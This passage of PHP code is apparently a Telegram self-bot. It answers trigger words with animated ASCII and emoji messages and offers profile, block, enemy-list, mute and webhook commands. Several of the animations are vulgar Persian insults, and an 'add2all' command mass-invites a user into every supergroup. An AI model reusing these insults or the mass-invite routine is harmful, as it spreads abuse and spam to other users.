█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██ 
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ 
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███ 
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███ 
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████ 
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████ 
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████ 
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████ 
██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████ 
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████ 
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████ 
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████']);

                    }
                    if ($text == 'love3' or $text == 'Love3' or $text == 'دوست') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
▀██▀─▄███▄─▀██─██▀██▀▀█
─██─███─███─██─██─██▄█']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
─██─▀██▄██▀─▀█▄█▀─██▀█
▄██▄▄█▀▀▀─────▀──▄██▄▄█']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
▀██▀─▄███▄─▀██─██▀██▀▀█
─██─███─███─██─██─██▄█
─██─▀██▄██▀─▀█▄█▀─██▀█
▄██▄▄█▀▀▀─────▀──▄██▄▄█']);

                    }
                    if ($text == 'دهنت سرویس' or $text == 'koni' or $text == 'کونی' or $text == 'خخخ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
░░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
░░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░']);

                    }
                    if ($text == 'تکصننت' or $text == 'ksnne2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'کـــ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کــص']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کــص ن']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کـــص نـــنـ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کـــص نـنـتـ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝کص نـنـت']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘کـــص نـنـت دیگه☘']);
                    }
                    if ($text == 'بکشش' or $text == '/Bokoshesh') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐                     •🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐                    • 🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐                  •   🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐                •     🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐              •       🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐            •         🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐           •          🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐         •            🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐       •              🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐     •                🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐   •                  🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐 •                    🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😐•                     🔫
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😵                       🔫😏
"]);
                    }
                    if ($text == 'bk2' or $text == 'بکیرم2') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤤🤤🤤
🤤         🤤
🤤           🤤
🤤        🤤
🤤🤤🤤
🤤         🤤
🤤           🤤
🤤           🤤
🤤        🤤
🤤🤤🤤
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😂         😂
😂       😂
😂     😂
😂   😂
😂😂
😂   😂
😂      😂
😂        😂
😂          😂
😂            😂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
👽👽👽          👽         👽
😍         😍      😍       😍
😎           😎    😎     😎
🤬        🤬       🤬   🤬
😄😄😄          🤓 🤓
🤨         😊      😋   😋
🤯           🤯    🤯     🤯
🤘           🤘    😘        😘
🤫       🤫        🙊          🙊
🤡🤡🤡          😗             🙊"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
😏         😏      😏       😏
😏           😏    😏     😏
😄        😄       😄   😄
😄😄😄          😄😄
🤘         🤘      🤘   🤘
🤘           🤘    🤘      🤘
🙊           🙊    🙊        🙊
🙊       🙊        🙊          🙊
💋💋💋          💋            💋"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😏         😏      😏       😏
😄           😄    😄     😄
😄        😄       😄   😄
🤘🤘🤘          🤘🤘
🤘         🤘      🤘   🤘
🙊           🙊    🙊      🙊
🙊           🙊    🙊        🙊
💋       💋        💋          💋
💋💋??          💋            💋"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😄         😄      😄       😄
😄           😄    😄     😄
🤘        🤘       🤘   🤘
🤘🤘🤘          🤘🤘
🙊         🙊      🙊   🙊
🙊           🙊    🙊      🙊
💋           💋    💋        💋
💋       💋        💋          💋
😏😏😏          😏            😏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
😄         😄      😄       😄
🤘           🤘    🤘     🤘
🤘        🤘       🤘   🤘
🙊🙊🙊          🙊🙊
🙊         🙊      🙊   🙊
💋           💋    💋      💋
💋           💋    💋        💋
😏       😏        😏          😏
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
🤘         🤘      🤘       🤘
🤘           🤘    🤘     🤘
🙊        🙊       🙊   🙊
🙊🙊🙊          🙊🙊
💋         💋      💋   💋
💋           💋    💋      💋
😏           😏    😏        😏
😏       😏        😏          😏
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🤘         🤘      🤘       🤘
🙊           🙊    🙊     🙊
🙊        🙊       🙊   🙊
💋💋💋          💋💋
💋         💋      💋   💋
😏           😏    😏      😏
😏           😏    😏        😏
😄       😄        😄          😄
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🙊         🙊      🙊       🙊
🙊           🙊    🙊     🙊
💋        💋       💋   💋
💋💋💋          💋💋
😏         😏      😏   😏
😏           😏    😏      😏
😄           😄    😄        😄
😄       😄        😄          😄
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
🙊         🙊      🙊       🙊
💋           💋    💋     💋
💋        💋       💋   💋
😏😏😏          😏😏
😏         😏      😏   😏
😄           😄    😄      😄
😄           😄    😄        😄
🤘       🤘        🤘          🤘
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
💋         💋      💋       💋
💋           💋    💋     💋
😏        😏       😏   😏
😏😏😏          😏😏
😄         😄      😄   😄
😄           😄    😄      😄
🤘           ??    🤘        🤘
🤘       🤘        🤘          🤘
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
💋         💋      💋       💋
😏           😏    😏     😏
😏        😏       😏   😏
😄😄😄          😄😄
😄         😄      😄   😄
🤘           🤘    🤘      🤘
🤘           🤘    🤘        🤘
🙊       🙊        🙊          🙊
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
😏         😏      😏       😏
😏           😏    😏     😏
😄        😄       😄   😄
😄😄😄          😄😄
🤘         🤘      🤘   🤘
🤘           🤘    🤘      🤘
🙊           🙊    🙊        🙊
🙊       🙊        🙊          🙊
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😏         😏      😏       😏
😄           😄    😄     😄
😄        😄       😄   😄
🤘🤘🤘          🤘🤘
🤘         🤘      🤘   🤘
🙊           🙊    🙊      🙊
🙊           🙊    🙊        🙊
💋       💋        💋          💋
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😄         😄      😄       😄
😄           😄    😄     😄
🤘        🤘       🤘   🤘
🤘🤘🤘          🤘🤘
🙊         🙊      🙊   🙊
🙊           🙊    🙊      🙊
💋           💋    💋        💋
💋       💋        💋          💋
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
😄         😄      😄       😄
🤘           🤘    🤘     🤘
🤘        🤘       🤘   🤘
🙊🙊🙊          🙊🙊
🙊         🙊      🙊   🙊
💋           💋    💋      💋
💋           💋    💋        💋
😏       😏        😏          😏
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
🤘         🤘      🤘       🤘
🤘           🤘    🤘     🤘
🙊        🙊       🙊   🙊
🙊🙊🙊          🙊🙊
💋         💋      💋   💋
💋           💋    💋      💋
😏           😏    😏        😏
😏       😏        😏          😏
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🤘         🤘      🤘       🤘
🙊           🙊    🙊     🙊
🙊        🙊       🙊   🙊
💋💋💋          💋💋
💋         💋      💋   💋
😏           😏    😏      😏
😏           😏    😏        😏
😄       😄        😄          😄
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🙊         🙊      🙊       🙊
🙊           🙊    🙊     🙊
💋        💋       💋   💋
💋??💋          💋💋
😏         😏      😏   😏
😏           😏    😏      😏
😄           😄    😄        😄
😄       😄        😄          😄
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
🙊         🙊      🙊       🙊
💋           💋    💋     💋
💋        💋       💋   💋
😏😏😏          😏😏
😏         😏      😏   😏
😄           😄    😄      😄
😄           😄    😄        😄
🤘       🤘        🤘          🤘
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
💋         💋      💋       💋
💋           💋    💋     💋
😏        😏       😏   😏
😏😏😏          😏😏
😄         😄      😄   😄
😄           😄    😄      😄
🤘           🤘    🤘        🤘
🤘       🤘        🤘          🤘
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
💋         💋      💋       💋
😏           😏    😏     😏
😏        😏       😏   😏
😄😄😄          😄😄
😄         😄      😄   😄
🤘           🤘    🤘      🤘
🤘           🤘    🤘        🤘
🙊       🙊        🙊          🙊
🙊🙊🙊          🙊            🙊
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
💋💋💋          💋         💋
😏         😏      😏       😏
😏           😏    😏     😏
😄        😄       😄   😄
😄😄😄          😄😄
🤘         🤘      🤘   🤘
🤘           🤘    🤘      🤘
🙊           🙊    🙊        🙊
🙊       🙊        🙊          🙊
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😏         😏      😏       😏
😄           😄    😄     😄
😄        😄       😄   😄
🤘🤘🤘          🤘🤘
🤘         🤘      🤘   🤘
🙊           🙊    🙊      🙊
🙊           🙊    🙊        🙊
💋       💋        💋          💋
💋💋💋          💋            💋
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😏😏😏          😏         😏
😄         😄      😄       😄
😄           😄    😄     😄
🤘        🤘       🤘   🤘
🤘🤘🤘          🤘🤘
🙊         🙊      🙊   🙊
🙊           🙊    🙊      🙊
💋           💋    💋        💋
??       💋        💋          💋
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
😄         😄      😄       😄
🤘           🤘    🤘     🤘
🤘        🤘       🤘   🤘
🙊🙊🙊          🙊🙊
🙊         🙊      🙊   🙊
💋           💋    💋      💋
💋           💋    💋        💋
😏       😏        😏          😏
😏😏😏          😏            😏
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
😄😄😄          😄         😄
🤘         🤘      🤘       🤘
🤘           🤘    🤘     🤘
🙊        🙊       🙊   🙊
🙊🙊🙊          🙊🙊
💋         💋      💋   💋
💋           💋    💋      💋
😏           😏    😏        😏
😏       😏        😏          😏
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🤘         🤘      🤘       🤘
🙊           🙊    🙊     🙊
🙊        🙊       🙊   🙊
💋💋💋          💋💋
💋         💋      💋   💋
😏           😏    😏      😏
😏           😏    😏        😏
😄       😄        😄          😄
😄😄😄          😄            😄
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤘🤘🤘          🤘         🤘
🙊         🙊      🙊       🙊
🙊           🙊    🙊     🙊
💋        💋       💋   💋
💋💋💋          💋💋
😏         😏      😏   😏
😏           😏    😏      😏
😄           😄    😄        😄
😄       😄        😄          😄
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🙊🙊🙊          🙊         🙊
🙊         🙊      🙊       🙊
💋           💋    💋     💋
💋        💋       💋   💋
😏😏😏          😏😏
😏         😏      😏   😏
😄           😄    😄      😄
😄           😄    😄        😄
🤘       🤘        🤘          🤘
🤘🤘🤘          🤘            🤘
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
🤬🤬🤬          🤬         🤬
😡         😡      😡       😡
🤬           🤬    🤬     🤬
😡        😡       😡   😡
🤬🤬🤬          🤬🤬
😡         😡      😡   😡
🤬           🤬    🤬      🤬
😡           😡    😡        😡
🤬       🤬        🤬          🤬
😡😡😡          😡            😡
"]);
                    }
                    if (preg_match("/^[\/\#\!]?(save)$/i", $text) && isset($message['reply_to_msg_id'])) {
                        $me = yield $this->get_self();
                        $me_id = $me['id'];
                        yield $this->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $me_id, 'id' => [$message['reply_to_msg_id']]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔱♨️> ꜱᴀᴠᴇᴅ🔱♨️"]);
                    }


                    if (preg_match("/^[\/\#\!]?(echo) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(echo) (on|off)$/i", $text, $m);
                        $data['echo'] = $m[2];
                        file_put_contents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴇᴄʜᴏ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }

                    if (preg_match("/^[\/\#\!]?(info) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(info) (.*)$/i", $text, $m);
                        $mee = yield $this->get_full_info($m[2]);
                        $me = $mee['User'];
                        $me_id = $me['id'];
                        $me_status = $me['status']['_'];
                        $me_bio = $mee['full']['about'];
                        $me_common = $mee['full']['common_chats_count'];
                        $me_name = $me['first_name'];
                        $me_uname = $me['username'];
                        $mes = "ɪᴅ : $me_id \nɴᴀᴍᴇ: $me_name \nᴜꜱᴇʀɴᴀᴍᴇ: @$me_uname \nꜱᴛᴀᴛᴜꜱ: $me_status \nʙɪᴏ: $me_bio \nᴄᴏᴍᴍᴏɴ ɢʀᴏᴜᴘꜱ ᴄᴏᴜɴᴛ: $me_common";
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $mes]);
                    }
                    if (preg_match("/^[\/\#\!]?(block) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(block) (.*)$/i", $text, $m);
                        yield $this->contacts->block(['id' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʙʟᴏᴄᴋᴇᴅ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(unblock) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(unblock) (.*)$/i", $text, $m);
                        yield $this->contacts->unblock(['id' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴜɴʙʟᴏᴄᴋᴇᴅ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(checkusername) (@.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(checkusername) (@.*)$/i", $text, $m);
                        $check = yield $this->account->checkUsername(['username' => str_replace("@", "", $m[2])]);
                        if ($check == false) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴇxɪꜱᴛꜱ!"]);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ꜰʀᴇᴇ!"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(setfirstname) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(setfirstname) (.*)$/i", $text, $m);
                        yield $this->account->updateProfile(['first_name' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ꜰɪʀꜱᴛ ɴᴀᴍᴇ ꜱᴇᴛ️✅"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setlastname) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(setlastname) (.*)$/i", $text, $m);
                        yield $this->account->updateProfile(['last_name' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ʟᴀꜱᴛ ɴᴀᴍᴇ ꜱᴇᴛ✅"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setphoto) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(setphoto) (.*)$/i", $text, $m);
                        if (strpos($m[2], '.jpg') !== false or strpos($m[2], '.png') !== false) {
                            copy($m[2], 'photo.jpg');
                            $photos_Photo = $this->photos->updateProfilePhoto(['id' => 'photo.jpg']);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🔥𝑵𝒆𝒘 𝒑𝒓𝒐𝒇𝒊𝒍𝒆 𝒑𝒊𝒄𝒕𝒖𝒓𝒆 𝒔𝒆𝒕 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚🔥', 'reply_to_msg_id' => $msg_id]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => '❌𝑻𝒉𝒆 𝒇𝒊𝒍𝒆 𝒊𝒔 𝒏𝒐𝒕 𝒊𝒏 𝒕𝒉𝒆 𝒑𝒉𝒐𝒕𝒐 𝒍𝒊𝒏𝒌.', 'reply_to_msg_id' => $msg_id]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(webhook)  (.*) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(webhook)  (.*) (.*)$/i", $text, $m);
                        $token = $m[2];
                        $adress = $m[3];
                        file_get_contents('https://api.telegram.org/bot' . $token . '/setWebhook?url=' . $adress);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$adress-$token webhooked✅."]);
                    }
                    if (preg_match("/^[\/\#\!]?(setbio) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(setbio) (.*)$/i", $text, $m);
                        yield $this->account->updateProfile(['about' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ᴀʙᴏᴜᴛ ꜱᴇᴛ✅"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setusername) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(setusername) (.*)$/i", $text, $m);
                        yield $this->account->updateUsername(['username' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɴᴇᴡ ᴜꜱᴇʀ ɴᴀᴍᴇ ꜱᴇᴛ✅"]);
                    }
                    if (preg_match("/^[\/\#\!]?(join) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(join) (.*)$/i", $text, $m);
                        yield $this->channels->joinChannel(['channel' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴊᴏɪɴᴇᴅ!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(add2all) (@.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(add2all) (@.*)$/i", $text, $m);
                        $dialogs = yield $this->get_dialogs();
                        foreach ($dialogs as $peeer) {
                            $peer_info = yield $this->get_info($peeer);
                            $peer_type = $peer_info['type'];
                            if ($peer_type == "supergroup") {
                                yield $this->channels->inviteToChannel(['channel' => $peeer, 'users' => [$m[2]]]);
                            }
                        }
                        $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴀᴅᴅᴇᴅ ᴛᴏ ᴀʟʟ ꜱᴜᴘᴇʀɢʀᴏᴜᴘꜱ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(newanswer) (.*) \|\|\| (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(newanswer) (.*) \|\|\| (.*)$/i", $text, $m);
                        $txxt = $m[2];
                        $answeer = $m[3];
                        if (!isset($data['answering'][$txxt])) {
                            $data['answering'][$txxt] = $answeer;
                            file_put_contents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Nҽɯ Wσɾԃ ADDED Tσ AɳʂɯҽɾLιʂƚ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Tԋιʂ Wσɾԃ Wαʂ Iɳ Aɳʂɯҽɾʅιʂƚ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text, $m);
                        $txxt = $m[2];
                        if (isset($data['answering'][$txxt])) {
                            unset($data['answering'][$txxt]);
                            file_put_contents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Wσɾԃ Dҽʅҽƚҽԃ Fɾσɱ Aɳʂɯҽɾʅιʂƚ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Tԋιʂ Wσɾԃ Wαʂɳ'ƚ IN Aɳʂɯҽɾʅιʂƚ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(reset answers)$/i", $text)) {
                        $data['answering'] = [];
                        file_put_contents("data.json", json_encode($data));
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "Aɳʂɯҽɾʅιʂƚ IS Nσɯ Eɱρƚყ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setenemy) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(setenemy) (.*)$/i", $text, $m);
                        $mee = yield $this->get_full_info($m[2]);
                        $me = $mee['User'];
                        $me_id = $me['id'];
                        $me_name = $me['first_name'];
                        if (!in_array($me_id, $data['enemies'])) {
                            $data['enemies'][] = $me_id;
                            file_put_contents("data.json", json_encode($data));
                            yield $this->contacts->block(['id' => $m[2]]);
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ɪꜱ ɴᴏᴡ ɪɴ ᴇɴᴇᴍʏ ʟɪꜱᴛ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱ ɪɴ ᴇɴᴇᴍʏʟɪꜱᴛ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(mute) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(mute) (.*)$/i", $text, $m);
                        $mee = yield $this->get_full_info($m[2]);
                        $me = $mee['User'];
                        $me_id = $me['id'];
                        $me_name = $me['first_name'];
                        if (!in_array($me_id, $data['muted'])) {
                            $data['muted'][] = $me_id;
                            file_put_contents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$me_name ɪꜱ ɴᴏᴡ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜᴇ ᴜꜱᴇʀ ᴡᴀꜱ ɪɴ ᴍᴜᴛᴇʟɪꜱᴛ"]);
                        }
                    }
